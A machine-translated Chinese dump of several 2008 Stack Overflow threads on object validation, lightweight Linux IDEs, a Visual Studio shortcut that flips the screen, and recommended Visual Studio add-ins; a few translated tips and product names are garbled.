WPF 的“ValidatesOnDataError”绑定属性使这变得特别容易。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-09-23T19:44:28.420

我尽量不让我的对象进入无效状态，所以 setter 肯定会有验证以及任何改变状态的方法。这样，我就不必担心我正在处理的对象是无效的。如果您将方法保留为验证边界，那么您永远不必担心验证框架和到处散布的 IsValid() 方法调用。****

# php - 适用于 Linux 的轻量级 IDE

> ID：2756
> 
> 赞同：10
> 
> 时间：2008-08-05T19:57:11.827
> 
> 标签：php, c++, linux, ide

即使我有一台功能强大且速度快的计算机（具有 2Gb RAM 的奔腾双核 2.0），我也一直在寻找轻量级的软件来安装它，因此即使许多应用程序同时启动并运行，它也能快速运行。

在过去的几周里，我一直在逐渐迁移到 Linux，并想安装一个免费的轻量级但有用的 IDE，以便在 C++ 和 PHP 上编程。语法高亮和代码完成提示是必备的。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-08-07T17:48:41.463

如果您花时间切换到 linux，我也会在某个时候切换到 emacs 或 vim。总会有资源或文档*准确*描述您在其中任何一个方面遇到的问题，通常只需单击几下即可解决。

由于无模式编辑，Emacs 一开始可能更容易......但不要让模式编辑吓跑你远离 Vim。

Vim 或 Emacs 的关键在于知道它可能会花费你一天的大部分时间来弄清楚你想让他们做什么，更不用说如何让他们这样做了。

一旦他们为你工作，你就会明白为什么大多数人都在两个阵营之一。

**一般提示：**

*   为您的项目设置 Makefile 几乎总是值得的。
*   使用 cscope 和/或 ctags 将使您的生活更轻松。

**Vim 提示：**

*   ：制作
*   :cn, :cp
*   全方位完成
*   使用 BufRead 自动加载来设置 :make 应该根据文件类型执行的操作

**Emacs 提示：**

*   欧洲央行很有趣
*   MX 指示
*   米-。M-, M-* 用于 etags 的 Mx 完整标签
*   MX 编译
*   (add-hook 'mylanguage-mode-hook '(lambda () (setq my-customizations t)))

并查看其他人的[自定义](http://dev.codemac.net/config.git)，以了解其他人所做的示例。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2008-08-05T19:59:59.640

[编辑](http://projects.gnome.org/gedit/)

*   语法高亮
*   快速、轻便
*   标签
*   图形用户界面

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2008-08-05T20:13:16.150

几十年来，Linux 程序员一直在使用 emacs。它具有语法突出显示功能，速度很快，并且您可以找到一百万个教程。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2008-09-20T19:18:30.957

控制台编辑器，例如[emacs](http://www.gnu.org/software/emacs/)和[vi](http://www.vim.org/)，比它们的 GUI 对应物更轻量级，并且（至少这两个是）与任何其他 IDE（语法突出显示、鼠标支持、ctags、自动完成......一直到 gdb 一样）一体化）。学习曲线可能有点陡峭，您可能需要进行一些自定义，但这一切都是值得的。此外，vi 出现在每个类 unix 操作系统的安装中。

在 X 应用程序中，有

*   GNOME 附带的[gedit并具有许多这些 IDE 功能（例如，请参阅](http://www.gnome.org/projects/gedit/)[此博客条目](http://www.micahcarrick.com/09-29-2007/gedit-html-editor.html)），

*   [Geany](http://www.geany.org/) - 非常快，仅依赖于 GTK，并且具有更多功能，包括代码折叠。

这些将是轻量级 IDE，而不是像[Anjuta](http://anjuta.sourceforge.net/)、[KDevelop](http://www.kdevelop.org/)、[Eclipse](http://www.eclipse.org/)或[NetBeans](http://www.netbeans.org/)这样的重量级 IDE 。

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2008-08-07T16:38:30.950

[Vim](http://en.wikipedia.org/wiki/Vim_(text_editor))（或宗教不同的 Emacs）将永远是我对这个问题的第一个答案，在任何点击式 IDE 上。正如他们在[The Pragmatic Programmer中所写](http://en.wikipedia.org/wiki/Pragmatic_Programmer)

> 选择一个编辑器，彻底了解它，并将其用于所有编辑任务。[...] 编辑器将是您的手的延伸；当他们在文本和思想中切开它们的方式时，键会唱歌。这就是我们的目标。
> 
> 确保您选择的编辑器在您使用的所有平台上都可用。

Vim 是可配置的、可扩展的、可编程的，并且可以变成具有所有常规功能的 IDE。最近我一直在使用[Eclim](http://eclim.sourceforge.net/)来“为 Vim 编辑器带来 Eclipse 功能”（项目、更好的 java 支持等），使其成为一个具有高级 IDE 功能的完整平台。

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2008-08-05T22:34:56.440

乔伊，我相信任何东西都比 Eclipse 更轻！:o)

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2008-08-05T21:10:30.353

我在 Mac、Windows 和 Ubuntu 之间徘徊，虽然 Emacs 曾经是我选择的编辑器，但我发现在我晚年时我更喜欢基于 GUI 的东西（对 shell 使用命令行仍然可以） . 我首选的编辑器是[Komodo Edit](http://www.activestate.com/Products/komodo_ide/komodo_edit.mhtml "科莫多编辑")，它的优点是：

*   自由（如啤酒）
*   适用于 Mac、Windows 和 Linux
*   大量语言的语法突出显示，包括 C++ 和 PHP（我自己将它用于 Ruby、Python 和 PHP）
*   代码完成，即使是我自己定义的类
*   能够通过 FTP、SFTP 或 SCP “远程保存”
*   支持将文件组织到项目中
*   选项卡和其他界面细节

我不确定它有多轻巧，但它确实比 Eclipse 感觉更敏捷！

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2008-12-01T00:35:23.727

怎么没有人提到[Code::Blocks](http://www.codeblocks.org/)！

它不仅是一个出色的 C++ 开源 IDE，而且它是完全跨平台的，所以如果你需要在 Windows 或 Mac 上工作一段时间，你可以使用完全相同的 IDE 和完全相同的项目文件来做到这一点！这非常适合交叉编译！

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-08-14T20:24:33.130

我不确定您所说的“轻量级”究竟是什么意思，但这里有一些流行的 linux IDE：

[Anjuta](http://anjuta.sourceforge.net/) for Gtk/Gnome
[KDevelop](http://www.kdevelop.org/)或[Quanta](http://quanta.kdewebdev.org/) for KDE
[CodeBlocks](http://www.codeblocks.org/)在 Windows/Mac/Linux 上运行并用 C++ 编写

这些都不是Java，因此它们在性能方面自动优于Eclipse；）

另一个选项是[MonoDevelop](http://www.monodevelop.com/)，它面向 .Net/Gtk# 编程，但也包括 C++ 支持。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-09-20T19:25:13.717

这是一个非常宗教性的问题 - 只需选择您喜欢的问题。每个编辑器都有其优点/缺点，您需要决定哪一套最适合您。有许多 IDE 可以使用各种编辑器，例如[Pida](http://pida.co.uk/)。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2011-01-16T10:24:20.880

没有人提到凯特。它比 vi 更容易启动（并且对于那些想要迁移到 vi 的人来说有很好的 vi 模式），比 gedit 有更多的选项（以及更好的语法突出显示）。它还具有 kioslaves 支持（非常适合远程服务器 PHP 开发），而且它只比 gedit 对 CPU 的要求高一点。它还可以具有内置控制台（如果您想快速 grep 通过文件或编译项目，这将非常有用）。

还有以下功能：

*   基本代码完成
*   高级缩进和块选择操作
*   好且非常干净（阅读）用正则表达式查找/替换
*   ctrl+d 上的注释（如果在函数头上使用，它会注释掉一行或一个函数）

还有更多...

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-08-05T20:15:40.123

任何流行的编辑器都可以变成 ide。

我在控制台上使用 Vi 并且多年来使用过各种 gui 编辑器。这不仅适用于 linux，我在 Windows 上使用 Crimson Editor 作为 C/python/z80asm ide。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2010-01-12T09:43:33.483

使用[linuxtools](http://www.eclipse.org/linuxtools/)的 eclipse 怎么样？

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2011-03-15T08:47:31.227

*   如果您正在使用或安装了 Java ，您可以查看[jEdit 。](http://en.wikipedia.org/wiki/JEdit)
*   [jEdit](http://en.wikipedia.org/wiki/JEdit)（[维基百科文章](http://en.wikipedia.org/wiki/JEdit)）

同样，它是一个“智能编辑器”，而不是一个 IDE。似乎知道如何处理大多数语言，并且一旦开始它就非常聪明，仍然是 Java，但比 Netbeans 和 Eclipse 更少的资源消耗。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2011-08-18T06:24:07.707

我会说**Bluefish**，它不是一个 IDE，而是一个不错的轻量级代码编辑器，具有语法高亮和代码完成（以及许多其他）功能，适用于相当多的语言（其中包括**C**和**Php**）。

# visual-studio - 在 Visual Studio 2008 中查看所有打开的文档是否有键盘快捷键

> ID：2765
> 
> 赞同：10
> 
> 时间：2008-08-05T20:01:31.057
> 
> 标签：visual-studio, keyboard, shortcuts

我正在尝试学习 Visual Studio 中的键盘快捷键以提高工作效率。因此，我下载了一个文档，其中显示了在使用[Microsoft 的 VS 2008 IDE 时 Visual Basic 中的许多默认键绑定。](http://www.microsoft.com/downloads/details.aspx?familyid=255b8cf1-f6bd-4b55-bb42-dd1a69315833&displaylang=en)

当我尝试他们所说的查看所有打开文档（**`CTRL`++ `ALT`）`DOWN ARROW`**的键盘快捷键时，我在 XP 机器上得到了一个完全出乎意料的结果；我的整个屏幕显示被颠倒了！

这是微软某人的恶作剧吗？我无法想象这种翻转屏幕会有什么实用价值。

有谁知道在 VS 2008 中查看所有打开文档的*正确键盘快捷键是什么？*

哦，如果您尝试使用上面的快捷方式，它会像我的方式一样翻转您的显示，请执行**`CTRL`++`ALT`将`UP ARROW`**其切换回来。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-08-05T20:08:23.490

这是图形驱动程序和 Visual Studio 之间的冲突。转到您的驱动程序设置页面（控制面板）并禁用显示旋转快捷方式。消除此冲突后，快捷方式将在 Visual Studio 中运行。

# visual-studio - Microsoft Visual Studio 的推荐加载项/插件

> ID：2767
> 
> 赞同：211
> 
> 时间：2008-08-05T20:02:33.033
> 
> 标签：visual-studio, plugins, add-on

任何人都可以推荐任何好的**附加组件**或**插件**吗`Microsoft Visual Studio`？
免费赠品是首选，但如果物有所值，那也没关系。

* * *

## 回答 #1

> 赞同：139
> 
> 时间：2008-09-16T18:17:49.600

[SmartPaster](http://weblogs.asp.net/alex_papadimoulis/archive/2004/05/25/Smart-Paster-1.1-Add-In---StringBuilder-and-Better-C_2300_-Handling.aspx) - （免费）复制/粘贴字符串的代码生成器

[AnkhSvn](http://ankhsvn.open.collab.net/) -（免费）VS.NET 的 SVN 源代码控制集成

[VisualSVN 服务器](http://www.visualsvn.com/server/)- （免费）源代码管理

[ReSharper](http://www.jetbrains.com/resharper/index.html) - 有助于重构和提高生产力的 IDE 增强功能

[CodeRush](http://www.devexpress.com/Products/Visual_Studio_Add-in/Coding_Assistance/) - 类固醇上的代码生成宏

[Refactor](http://www.devexpress.com/Products/Visual_Studio_Add-in/Refactoring/) - 代码重构辅助

[CodeMaid](http://www.codemaid.net/) (免费) - 代码清理、组织和复杂性分析

[CodeSmith](http://www.codesmithtools.com/) - 代码生成器

[GhostDoc](http://www.roland-weigelt.de/ghostdoc/) -（免费）简单的代码注释工具

[DXCore](http://www.devexpress.com/Downloads/Visual_Studio_Add-in/DXCore/) (FREE) 及其许多很棒的插件：[DxCore Community Plugins](http://code.google.com/p/dxcorecommunityplugins/)、[CR_Documentor](http://code.google.com/p/cr-documentor/)、[CodeStyleEnforcer](http://joel.fjorden.se/static.php?page=CodeStyleEnforcer)、[RedGreen](http://www.rorybecker.me.uk/DevExpress/Plugins/Community/RedGreen/)

[TestDriven.Net](http://www.testdriven.net/) -（免费/付费）单元测试帮助

[Reflector](http://www.red-gate.com/products/reflector/) - （付费）功能丰富的 .Net Disassembler [Reflector AddIn's](http://www.codeplex.com/reflectoraddins)

[Web 部署项目](http://www.microsoft.com/downloads/details.aspx?FamilyId=0AA30AE8-C73B-4BDD-BB1B-FE697256C459&displaylang=en)- 提供额外的功能来构建和部署网站和 Web 应用程序（[源](http://www.microsoft.com/downloads/details.aspx?FamilyId=0AA30AE8-C73B-4BDD-BB1B-FE697256C459&displaylang=en)）。

StudioTools -（免费）导航助手、代码度量工具、增量搜索、Visual Studio 中的文件浏览器和撕下编辑器窗口。从[旧网站 (archive.org)](https://web.archive.org/web/20100218144023/http://www.exactmagic.com/products/studiotools/index.html)移至[新网站](http://submain.com/products/studiotools.aspx)并停止使用。

* * *

## 回答 #2

> 赞同：98
> 
> 时间：2008-08-05T20:05:27.630

不是免费的，但[ReSharper](http://www.jetbrains.com/resharper/index.html)绝对是一项推荐。

* * *

## 回答 #3

> 赞同：52
> 
> 时间：2008-08-05T20:26:26.077

Whole Tomato 的[视觉辅助 X](http://www.wholetomato.com/)。我绝对发誓。我希望看到一个比Riverblade 的[Visual Lint更好的](http://www.riverblade.co.uk/products/visual_lint/index.html)[Lint](http://www.gimpel.com/)插件，但由于它最终会转移到构建服务器上，我不介意每隔几天手动运行一次。

* * *

## 回答 #4

> 赞同：35
> 
> 时间：2008-08-05T20:26:08.103

[PowerCommands](http://www.visualstudiogallery.com/ExtensionDetails.aspx?ExtensionId=df3f0c30-3d37-4e06-9ef8-3bff3508be31)是一个 Microsoft 创建的插件，它提供了许多人们认为可能一开始就应该存在于 Visual Studio 中的新功能。

这些包括

*   复制/粘贴项目参考！
*   “打开包含文件夹”直接跳转到文件或项目的硬盘位置
*   使用语句的自动重组和排序
*   “在此处打开命令提示符”以在您的任何项目文件夹中打开命令提示符。
*   折叠项目

* * *

## 回答 #5

> 赞同：25
> 
> 时间：2008-08-18T19:01:31.070

[RockScroll](http://www.hanselman.com/blog/IntroducingRockScroll.aspx)很棒，而且免费。

* * *

**附录**

正如@Andrei 指出的那样，[MetalScroll](http://code.google.com/p/metalscroll/)是一个更好的选择。它是开源的，并纠正了关于 RS 的一些烦人的事情。

* * *

## 回答 #6

> 赞同：20
> 
> 时间：2008-08-18T18:00:31.567

[我是CodeRush 和 Refactor](http://www.devexpress.com/Products/Visual_Studio_Add-in/Coding_Assistance/)的忠实粉丝！[DevExpress 的专业版](http://www.devexpress.com/Products/Visual_Studio_Add-in/Coding_Assistance/)。我已经使用它们很多年了，毫无疑问，它让我成为了一个更快的开发者。此外，两者都建立在一个名为[DXCore](http://www.devexpress.com/Downloads/Visual_Studio_Add-in/DXCore/index.xml)的免费框架上，该框架允许您为 Visual Studio 开发自己的插件，并且没有限制......

* * *

## 回答 #7

> 赞同：18
> 
> 时间：2008-08-05T20:31:21.120

*   [锐器](http://www.jetbrains.com/resharper/index.html)
*   [Resharper MbUnit 测试运行器附加组件](http://code.google.com/p/mbunit-resharper/)
*   [数据库项目的SQL 提示](http://www.red-gate.com/Products/SQL_Prompt/index.htm)（也可以在 SQL Management Studio 中使用）
*   [Ankh SVN 2.0](http://ankhsvn.open.collab.net/servlets/ProjectProcess?pageID=3794) + 免费支持 SVN（相比之下，v1.x 相形见绌）
*   [TeamCity 插件，](http://www.jetbrains.com/teamcity/features/supported_platforms.html#Microsoft_Visual_Studio_2005_and_2008_Integration)用于监控您的构建、个人构建和错误跟踪

* * *

## 回答 #8

> 赞同：15
> 
> 时间：2008-08-05T21:22:06.867

我发现[Ghost Doc](http://www.roland-weigelt.de/ghostdoc/)非常有用。

> GhostDoc 是 Visual Studio 的免费插件，可自动为 C# 生成 XML 文档注释。通过使用从基类或实现的接口继承的现有文档，或者通过从名称和类型（例如方法、属性或参数）中推断出注释。

* * *

## 回答 #9

> 赞同：14
> 
> 时间：2008-08-05T20:09:00.557

如果您使用 SVN 进行源代码控制，请务必使用 VisualSVN。它支持在 Visual Studio IDE 中进行 TortoiseSVN 交互。

我也回应了 Resharper 的评论。零售价有点高，但如果你是学生或其他受教育者，它实际上相当便宜。

* * *

## 回答 #10

> 赞同：14
> 
> 时间：2008-08-18T18:30:11.693

+1 视觉辅助。

不幸的是，您需要一个插件才能获得非常好的智能感知，但它绝对值得花钱。

* * *

## 回答 #11

> 赞同：12
> 
> 时间：2008-09-16T18:53:55.473

LinqPad 非常适合测试 linq to objects/xml/sql。免费下载。

* * *

## 回答 #12

> 赞同：11
> 
> 时间：2008-09-16T18:25:05.747

[IncrediBuild](http://www.xoreax.com/main.htm "IncrediBuild")怎么样？这是一个很好的分布式构建系统，集成了 Visual Studio。

* * *

## 回答 #13

> 赞同：9
> 
> 时间：2008-08-05T20:05:49.440

[剪贴板管理器](http://www.csharper.net/blog/web_deployer_2005_version_1_0_0_2_available.aspx#new_clipboard_manager_upgrade_1_0_0_4.aspx)

通过删除线条和其他一些不错的项目来维护您的剪贴板数据，但仅此一项就让我很高兴。

[区域化](http://www.rauchy.net/regionerate/)

虽然有些地区存在问题，但我认为如果您使用它们，此工具适合您。自动将您的代码区域化为适当的区域块。完全可配置的自定义项目等。

* * *

## 回答 #14

> 赞同：9
> 
> 时间：2010-09-05T19:52:01.593

[VS 命令 2010](http://visualstudiogallery.msdn.microsoft.com/en-us/d491911d-97f3-4cf6-87b0-6a2882120acf)

来自网站：最新版本支持：

*   管理参考路径
*   防止在解决方案资源管理器中意外拖放
*   防止意外删除链接文件
*   应用修复（自动修复构建错误/警告）
*   打开 PowerShell
*   显示装配详细信息
*   创建代码合约
*   第一个项目失败时取消构建
*   调试输出 - 自定义格式
*   构建输出 - 自定义格式
*   搜索输出 - 自定义格式
*   配置 WPF 渲染
*   配置融合日志
*   配置IE进行调试
*   找到源文件
*   IDE 导航器中的缩略图
*   对 xaml、aspx、css、js 和 html 文件的扩展支持
*   禁用 Ctrl + 鼠标滚轮缩放
*   缩放到鼠标指针
*   可配置性
*   附加到本地 IIS
*   复制完整路径
*   建立启动项目
*   打开命令提示符
*   在线搜索
*   建立统计
*   分组链接项目
*   复制/粘贴参考
*   复制/粘贴为链接
*   折叠解决方案
*   直接从用户界面对项目进行分组 (DependantUpon)
*   在 Expression Blend 中打开
*   在解决方案中定位
*   编辑项目文件
*   编辑解决方案文件
*   显示所有文件

和其他人，所以现在就试试吧！

* * *

## 回答 #15

> 赞同：8
> 
> 时间：2008-08-05T20:04:25.403

http://trolltech.com/products/qt/">Qt 跨平台应用框架

Qt 是一个用于桌面和嵌入式开发的跨平台应用程序框架。它包括直观的 API 和丰富的 C++ 类库、用于 GUI 开发和国际化的集成工具，以及对 Java™ 和 C++ 开发的支持

他们有一个 Visual Studio 插件，虽然要花点钱，但每一分钱都值。

* * *

## 回答 #16

> 赞同：8
> 
> 时间：2008-09-17T08:13:50.607

我已经使用 Visual Assist X 将近两年了，我发现它非常有用，我可以坦率地说，如果我的雇主不提供它，我将不得不自己付费。
我还使用 Cool Commands 和 SlickEdit（免费版），它们的 File Explorer 和 Command Spy 工具非常有用。

* * *

## 回答 #17

> 赞同：7
> 
> 时间：2008-08-31T11:38:13.020

+1 for Visual Assist 我将添加提供一种本地源代码控制系统的[VLH （Visual Local History）。](http://www.codeplex.com/VLH2005)每次保存文件时，插件都会在本地存储库中添加一个副本。

* * *

## 回答 #18

> 赞同：7
> 
> 时间：2008-12-09T18:15:37.590

[鸸鹋](http://www.viemu.com/)

VS 中的 vi/vim 支持

* * *

## 回答 #19

> 赞同：5
> 
> 时间：2008-09-09T12:54:16.380

我发现了这个名为[Visual Studio Gallery](http://www.visualstudiogallery.com/)的网站——它有很多 Visual Studio 插件。我现在正在浏览它，我建议大家访问它。

* * *

## 回答 #20

> 赞同：5
> 
> 时间：2008-09-16T19:45:28.737

[Consolas font](http://www.microsoft.com/downloads/details.aspx?familyid=22e69ae4-7e40-4807-8a86-b3d36fab68d3&displaylang=en) 来自 MS 的免费字体，专为阅读代码而设计。

* * *

## 回答 #21

> 赞同：5
> 
> 时间：2010-10-18T19:17:42.410

试试[金属卷轴](https://visualstudiogallery.msdn.microsoft.com/3a50c69b-9b35-4eb2-b06a-328758afcaa2/)！！比摇滚好听

* * *

## 回答 #22

> 赞同：4
> 
> 时间：2008-08-05T21:55:00.950

当您的解决方案中有大量文件并在解决方案资源管理器中搜索它们时，[Sonic File Finder会变得很痛苦。](http://jens-schaller.de/sonictools/sonicfilefinder/)

您可能还会发现[DPack](http://www.usysware.com/dpack/)很有趣。几个工具和增强功能整合到一个简洁的包中。

* * *

## 回答 #23

> 赞同：4
> 
> 时间：2008-08-28T17:19:15.190

[MZTools](http://mztools.com/index.aspx)也很棒。

* * *

## 回答 #24

> 赞同：4
> 
> 时间：2008-09-06T05:44:19.857

+1 用于 CodeRush 和 Refactor Pro。自从它的 Delphi 化身以来，我一直在使用 CodeRush，它非常棒。“以思想的速度编写代码”的口头禅非常接近现实；）

* * *

## 回答 #25

> 赞同：4
> 
> 时间：2008-09-09T12:09:36.627

1.  [Microsoft StyleCop](http://code.msdn.microsoft.com/sourceanalysis)为 C# 提供代码样式检查，我们一直在使用它并且喜欢它（免费）
2.  [Axialis IconWorkshop](http://www.axialis.com/download/iwlite.html)有一个 Visual Studio 插件，现在对 VS2008 用户免费。
3.  [Resharper](http://www.jetbrains.com/resharper/)是的，另一个投票，因为我不能投票给每个建议它的人 :)
4.  [适用于 C++ 的Workspace Whiz](http://workspacewhiz.com/)，我曾经使用 Workspace Whiz，但没有在 VS2008 中使用它，因为我没有意识到有更新。将不得不再试一次。

* * *

## 回答 #26

> 赞同：4
> 
> 时间：2008-09-16T19:44:05.870

如果您正在进行 C++ 编码，请放下[Visual Assist](http://www.wholetomato.com/)。

* * *

## 回答 #27

> 赞同：4
> 
> 时间：2008-09-16T20:00:46.610

我喜欢 CopySourceAsToHTML 作为一个很酷的小插件。如果您想在保持语法格式的同时复制用于博客等的代码块，那就太好了。

我认为这仍然是 url.. 你必须做一些手动工作才能使用 08 进行设置。 [http://www.jtleigh.com/people/colin/software/CopySourceAsHtml/](http://www.jtleigh.com/people/colin/software/CopySourceAsHtml/)

* * *

## 回答 #28

> 赞同：3
> 
> 时间：2008-09-15T11:33:42.310

我总是很惊讶有更多的人不知道/不使用[NDepend](http://www.ndepend.com/Default.aspx) - 它显示了代码各个级别的所有依赖项，甚至会绘制漂亮的框和箭头图片，显示您的架构到底有多混乱 :) 与 TestDriven 一起使用。 Net，我无法想象没有它的工作。免费/便宜。

* * *

## 回答 #29

> 赞同：3
> 
> 时间：2008-10-02T18:53:00.173

对于笔记本电脑或那些将 vi/vim 键绑定烧入大脑的人，我会推荐[ViEmu](http://www.viemu.com/)。

如果您还没有尝试使用 vi 键绑定进行编辑，这就是为什么您可能想尝试[“为什么，哦，为什么，那些 #?@! nutheads 使用 vi？”](http://www.viemu.com/a-why-vi-vim.html)

* * *

## 回答 #30

> 赞同：3
> 
> 时间：2009-09-04T21:41:03.813

[AtomineerUtils Pro 文档](http://www.atomineerutils.com/)- 自动 DocXml/Doxygen/JavaDoc/Qt 文档注释生成/更新（类似于 GhostDoc，但更强大和灵活，并支持 C#、C++、C++/CLI、C、Java 和 Visual Basic 代码）。

生成的评论的样式是非常可配置的，并且可以选择应用自动重新格式化（例如空格控制和自动换行）以保持评论尽可能可读。它还有许多帮助程序，允许用户阅读大多数遗留文档注释并将其转换为上述任何格式。

（我是作者，但我相信以上是准确客观的描述。此插件在首次添加此答案时是免费的，但用于支付托管、支持和每月继续改进插件的费用发布，现在是 10 美元，免费试用 30 天）

* * *

## 回答 #31

> 赞同：2
> 
> 时间：2008-09-16T18:51:13.610

我经常使用很多提到的插件。这里也只是一些 II 估计：

*   [自动版本控制的构建](http://www.codeproject.com/KB/macros/versioningcontrolledbuild.aspx)
*   [资源重构工具](http://www.codeplex.com/ResourceRefactoring)
*   [智能贴纸](http://weblogs.asp.net/alex_papadimoulis/archive/2004/05/25/141400.aspx)

这三个都是免费的，并且强烈推荐（由我）。

* * *

## 回答 #32

> 赞同：2
> 
> 时间：2008-09-16T19:20:18.670

我是第二个 VisualAssist，从 V6 开始就一直在使用它，没有它就活不下去了……

我看到没有人提到 CoolCommands：[http ://geekswithblogs.net/brians/archive/2007/03/04/107922.aspx](http://geekswithblogs.net/brians/archive/2007/03/04/107922.aspx)

伟大的节省时间...

* * *

## 回答 #33

> 赞同：2
> 
> 时间：2008-09-16T19:44:38.677

VisualAssistX 肯定 +1（没有它就无法工作，而且物有所值），VisualSVN 肯定 +1

* * *

## 回答 #34

> 赞同：2
> 
> 时间：2008-09-18T16:20:36.217

视觉辅助：没有它你就活不下去！

* * *

## 回答 #35

> 赞同：2
> 
> 时间：2008-09-21T23:28:52.297

我们已经讨论过这个问题：[你最喜欢的 Visual Studio 插件/设置是什么？](https://stackoverflow.com/questions/106340/what-is-your-favorite-visual-studio-add-insetting)

* * *

## 回答 #36

> 赞同：2
> 
> 时间：2010-04-15T13:57:18.407

我发现 Code Rocket 非常有用 - [http://www.getcoderocket.com/](http://www.getcoderocket.com/)

来自他们的网站：“Code Rocket 是一个创新工具，它揭示了 C#、……和 C/C++ 代码的内部工作原理，用于 Visual Studio……它使文档成为软件开发过程的无缝集成部分，直接插入以最小的开销为您的开发 IDE 提供强大的优势。”

* * *

## 回答 #37

> 赞同：2
> 
> 时间：2012-05-04T21:14:50.483

来自telerik的[JustDecompile 。](http://www.telerik.com/products/decompiler.aspx)现在，Reflector 不再免费。在挖掘提供的库时，它是必需的。

* * *

## 回答 #38

> 赞同：1
> 
> 时间：2008-08-18T18:12:52.573

我也喜欢**ReSharper**！如果您是学生或以其他方式与大学有联系，则可以负担得起。

对于与 SVN 的交互，我更喜欢**AnkhSVN**。

.. 当然，为了连接到 TeamFoundation Server，还有**Visual Studio Team Explorer**

* * *

## 回答 #39

> 赞同：1
> 
> 时间：2008-08-18T18:20:30.777

[Dispatch](http://dispatchasp.net) for FTP 应该是 Copy Web Site。

这刚刚出来，但我很喜欢它：[Mindscape File Explorer](http://www.mindscape.co.nz/Products/vsfileexplorer/)

VisualSVN 非常适合 SVN 集成。比 Ankh 好得多（虽然没有尝试过 Ankh 2+）

[SonicFileFinder](http://jens-schaller.de/sonictools/sonicfilefinder/overview/index.htm)用于快速查找文件或类。支持仅搜索驼峰式类型名称的大写部分

[Microsoft 的 Web 部署项目，](http://www.microsoft.com/downloads/details.aspx?familyid=0AA30AE8-C73B-4BDD-BB1B-FE697256C459&displaylang=en)用于预编译网站项目

* * *

## 回答 #40

> 赞同：1
> 
> 时间：2008-08-25T12:28:12.077

我经常使用 Fogbguz 插件，但你需要先使用 Fogbugz ！！！

* * *

## 回答 #41

> 赞同：1
> 
> 时间：2008-08-28T18:15:55.817

我刚刚发现了这个相当大的插件列表：

[http://geekswithblogs.net/brians/archive/2008/05/12/122087.aspx](http://geekswithblogs.net/brians/archive/2008/05/12/122087.aspx)

* * *

## 回答 #42

> 赞同：1
> 
> 时间：2008-09-04T11:45:55.153

+1 表示 VisualSVN 比 AnkhSVN 更好，两者都尝试过，FogBugz 插件 +1。

* * *

## 回答 #43

> 赞同：1
> 
> 时间：2008-09-09T11:57:21.963

[幽灵文档](http://www.roland-weigelt.de/ghostdoc/)

> GhostDoc 是 Visual Studio 的免费插件，可自动为 C# 生成 XML 文档注释。通过使用从基类或实现的接口继承的现有文档，或者通过从名称和类型（例如方法、属性或参数）中推断出注释。

* * *

## 回答 #44

> 赞同：1
> 
> 时间：2008-09-09T12:20:57.723

[KingsTools](http://www.codeproject.com/KB/macros/kingstools.aspx)也是一个不错的宏集合，其中包含：

*   运行 Doxygen
*   插入 Doxygen 评论
*   构建解决方案统计信息
*   依赖图
*   继承图
*   交换 .h<->.cpp
*   着色
*   } 结束
*   # C++ 的区域/#endregion

*   搜索网页

* * *

## 回答 #45

> 赞同：1
> 
> 时间：2008-09-16T19:51:09.627

[指导探索者](http://www.codeplex.com/guidanceExplorer)

指导包作为片段、项目和项目模板集成到 VS 中。它们提供了一种收集和重用模式、代码和操作方法答案的方法。您可以为您的团队创建指导，您可以下载来自 MS 的模式和实践组的指导包。

* * *

## 回答 #46

> 赞同：1
> 
> 时间：2008-09-16T19:55:30.927

绝对是Resharper。

* * *

## 回答 #47

> 赞同：1
> 
> 时间：2008-09-16T19:58:43.930

不是 VS 中真正的插件，而是每个 VS 使用需要的插件： [Code Preview Handler](http://timheuer.com/blog/archive/2006/12/13/13945.aspx) 提供一个预览处理程序，其中包含源文件的语法突出显示。该处理程序在资源管理器预览窗格和 Outlook 中附件的预览选项卡中工作。

* * *

## 回答 #48

> 赞同：1
> 
> 时间：2008-09-16T20:01:43.377

[Source Monitor](http://www.ddj.com/articles/2000/0003/0003toc.htm) 代码分析工具

[直接下载链接](http://www.ddj.com/ftp/2000/2000_03/sourcemonitor.zip)

* * *

## 回答 #49

> 赞同：1
> 
> 时间：2008-09-16T20:07:24.953

[更清晰](http://www.jetbrains.com/resharper/index.html)。它是任何软件工程师的最佳生产力工具！ [TestDriven.Net](http://testdriven.net/)也很不错。和[GhostDoc](http://www.roland-weigelt.de/ghostdoc/)。

* * *

## 回答 #50

> 赞同：1
> 
> 时间：2008-09-16T20:16:56.010

[VLINQ](http://code.msdn.microsoft.com/vlinq) LINQPad 是必不可少的，但对于 VS 中的快速内容，VLINQ 非常棒。

* * *

## 回答 #51

> 赞同：1
> 
> 时间：2008-09-16T20:18:21.840

[Source Code Outliner](http://www.visualstudiogallery.com/ExtensionDetails.aspx?ExtensionID=bea9ed59-8857-4032-9666-9af1c1a33969) 不错的源文件替代视图。它是代码窗格中的大纲，但没有所有代码妨碍结构。

* * *

## 回答 #52

> 赞同：1
> 
> 时间：2008-09-17T10:31:28.387

*   [重构！临](http://www.devexpress.com/Products/Visual_Studio_Add-in/Refactoring/)- 商业。提供免费版本。
*   [GhostDoc](http://www.roland-weigelt.de/ghostdoc/) - 免费
*   [评论重花](http://commentreflower.sourceforge.net/)- 免费
*   [版本控制构建](http://www.codeproject.com/KB/macros/versioningcontrolledbuild.aspx)- 免费

* * *

## 回答 #53

> 赞同：1
> 
> 时间：2008-09-18T16:17:16.363

如果你喜欢 vi/vim 编辑：

[用于 Visual Studio 的 ViEmu](http://www.viemu.com)

如果您想要颜色编码的控制流语法突出显示和图形轮廓：

[代码卡纳](http://www.codekana.com)

我是这些商业工具的开发者。

* * *

## 回答 #54

> 赞同：1
> 
> 时间：2008-12-02T11:06:57.367

这是我的清单：

